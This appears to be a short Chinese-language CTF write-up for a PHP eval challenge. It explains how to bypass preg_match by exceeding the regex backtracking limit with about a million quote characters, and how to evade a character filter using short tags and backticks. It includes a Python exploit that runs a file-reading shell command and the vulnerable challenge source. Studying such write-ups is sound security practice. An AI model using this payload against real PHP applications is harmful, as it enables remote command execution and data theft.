tags:: Regex

- # 思路
	- 使用[[CTF/PHP/正则匹配回溯次数绕过]]绕过preg_match限制，并绕过`checkdata`函数的检查
- # 绕过preg_match
	- 因为字符`'`可以匹配`.*`，但是无法匹配后面的子匹配，我们只要在payload中加入大量`'`即可绕过
- # 绕过check_data
	- check_data禁止了包括括号在内的大量字符，我们可以使用短标签加上反引号执行任意Linux Shell命令
- # exp
	- ```python
	  payload = json.dumps({
	      "cmd": "?><?=`nl /f*`?><?#" + "'" * 1010000,
	  })
	  
	  r = requests.post(url, data = {
	      "letter": payload
	  })
	  
	  print(r.text)
	  ```
- # 题目源码
	- ```php
	   <?php
	  include "check.php";
	  if (isset($_REQUEST['letter'])){
	      echo "entering...\n";
	      $txw4ever = $_REQUEST['letter'];
	      if (preg_match('/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&|!|\<|\>|\{|\x09|\x0a|\[).*$/m',$txw4ever)){
	          die("再加把油喔");
	      }
	      else{
	          $command = json_decode($txw4ever,true)['cmd'];
	          checkdata($command);
	          @eval($command);
	      }
	  }
	  else{
	      echo "out.";
	      highlight_file(__FILE__);
	  }
	  ?>
	  
	  ```